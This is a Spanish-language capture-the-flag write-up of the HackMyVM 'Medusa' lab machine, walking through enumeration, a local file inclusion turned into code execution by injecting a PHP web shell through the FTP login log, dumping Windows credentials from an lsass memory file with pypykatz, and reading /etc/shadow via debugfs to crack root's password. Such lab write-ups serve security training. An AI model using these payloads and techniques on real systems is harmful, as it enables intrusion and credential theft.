---
title: "Medusa Write-Up - HackMyVM"
description: "Medusa Write-Up - HackMyVM"
pubDatetime: 2023-09-05
tags:
  [
    "fácil",
    "hackmyvm",
    "brute force",
    "LFI",
    "log poisoning",
    "cracking",
    "debugfs",
  ]
---

> Tengo la máquina corriendo por la siguiente IP asignada por DHCP: `192.168.134.131`

# Reconocimiento

Comenzamos con un escaneo de puertos abiertos por TCP con `nmap`.

```bash
❯ sudo nmap -sSCV -p- 192.168.134.131
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 03:51 CEST
Nmap scan report for 192.168.134.131
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:49:D9:D5 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds
```

Tenemos FTP (21), SSH (22) y HTTP (80).

## Reconocimiento web

De primeras encontramos la página por defecto de apache.

![](@assets/HackMyVM/medusa/default.png)

Pero al final de la página hay algo que no es por defecto.

![](@assets/HackMyVM/medusa/kraken.png)

Pruebo la palabra **Kraken** para entrar por SSH y por FTP pero nada.

Fuzzendo con `gobuster` encuentro una ruta `/hades` en la que, de nuevo fuzzeando recursivamente existe un archivo `/hades/door.php`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.134.131/hades -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.134.131/hades
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/door.php             (Status: 200) [Size: 555]
/.php                 (Status: 403) [Size: 280]
Progress: 1038145 / 1038150 (100.00%)
===============================================================
Finished
===============================================================
```

![](@assets/HackMyVM/medusa/hades.png)

En esta supuestamente tenemos que introducir la palabra correcta y se nos limitan los carácteres a 6.

Luego manda una petición por POST a `/hades/d00r_validation.php` con la palabra como data.

Pruebo **Kraken** y me devuelve otra respuesta.

![](@assets/HackMyVM/medusa/correct.png)

Parece una pista así que añado **medusa.hmv** al `/etc/hosts` y recargo.

Pero no parece que haya cambiado nada así que fuzzeo por subdominios.

```bash
❯ gobuster vhost -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://medusa.hmv -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.134.131/hades
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.medusa.hmv Status: 200 [Size: 1973]
===============================================================
Finished
===============================================================
```

Dentro de este, de nuevo fuzzeando encuentro un directorio interesante `/files` con una ruta `/files/system.php`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://dev.medusa.hmv/files/ -t 200 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/files/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/system.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]
Progress: 41853 / 2370510 (1.77%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 41946 / 2370510 (1.77%)
===============================================================
Finished
===============================================================
```

## Local File Inclusion (LFI)

Encuentro que en esta última ruta existe un LFI con el parámetro **view**.

```bash
❯ ffuf -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/hosts' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fw 1

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.medusa.hmv/files/system.php?FUZZ=/etc/hosts
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

view                    [Status: 200, Size: 190, Words: 19, Lines: 8, Duration: 19ms]
:: Progress: [4723/4723] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

![](@assets/HackMyVM/medusa/lfi.png)

### LFI2RCE via Log Poisoning e intrusión

Explotando el LFI podemos intentar acceder logs internos del sistema.

Como antes habíamos visto que tenía un servicio FTP corriendo podemos intentar inyectar código PHP en ese log.

![](@assets/HackMyVM/medusa/ftp.png)

Veo que se ve reflejado el nombre que introducí al logearme así que intento inyectar el código por ahí.

```bash
❯ ftp 192.168.134.131
Connected to 192.168.134.131.
220 (vsFTPd 3.0.3)
Name (192.168.134.131:ziox): <?php system ($_GET ['cmd'])?>
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed.
```

Aunque no nos hayamos logueado correctamente, el intento se almacena en el log y al acceder, la página interpreta el PHP.

![](@assets/HackMyVM/medusa/rce.png)

Tenemos RCE, así que nos ponemos en escucha y mandamos una reverse shell.

![](@assets/HackMyVM/medusa/revshell.png)

# Movimiento lateral

Estando dentro como el usuario **www-data** vemos en la raíz del sistema un directorio `...`.

![](@assets/HackMyVM/medusa/unusual.png)

## Crackeando el zip

Listando sus contenidos vemos que hay un archivo `old_files.zip`.

![](@assets/HackMyVM/medusa/zip.png)

Me lo traigo mi máquina pero al descomprimirlo pide contraseña así que intento crackearlo con `john`.

![](@assets/HackMyVM/medusa/john.png)

Dentro contiene un archivo `lsass.DMP`

```bash
❯ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

## Extrayendo volcado del archivo `.DMP`

> Los archivos DMP son conocidos como archivos de volcado de memoria en ordenadores que funcionan con el sistema operativo Microsoft Windows.

Parece ser un archivo de volcado por lo que puede contener credenciales. Para dumpear su contenido podemos usar [pypykatz](https://github.com/skelsec/pypykatz)

```bash
❯ pypykatz lsa minidump -o lsass_dump.out lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
```

Filtrando en el archivo `lsass_dump.out` por **spectre** ya que es un usuario existente en la máquina encontramos una contraseña.

```bash
== LogonSession ==
authentication_id 845877 (ce835)
session_id 7
username spectre
...
== WDIGEST [ce835]==
        username spectre
        domainname Medusa-PC
        password 5p3ctr3_p0is0n_xX
...
```

Usándola para loguearnos en bash mediante `su specre`. Tenemos shell como **spectre** y la primera flag.

![](@assets/HackMyVM/medusa/user.png)

# Escalada de privilegios

De primeras vemos que el usuario **spectre** pertenece al grupo `disk`.

```bash
spectre@medusa:~$ groups
spectre disk cdrom floppy audio dip video plugdev netdev
```

Lo que significa que tenemos acceso al contenido de cualquier disco o partición del sistema.

Podemos usar `debugfs` para acceder a la partición donde la raíz del sistema está montada, este caso en `/dev/sda1`.

![](@assets/HackMyVM/medusa/debugfs.png)

Como el usuario **root** no tiene clave privada de SSH me traigo el `/etc/shadow` para intentar crackear la contraseña su contraseña.

> También podríamos simplemente leer la flag de root.

```bash
❯ john -w:/usr/share/seclists/rockyou.txt unshadow.txt --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (root)
1g 0:00:00:39 DONE (2023-09-06 04:36) 0.02520g/s 94.37p/s 94.37c/s 94.37C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya podemos loguearnos como **root**.

![](@assets/HackMyVM/medusa/root.png)

# Referencias

- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)
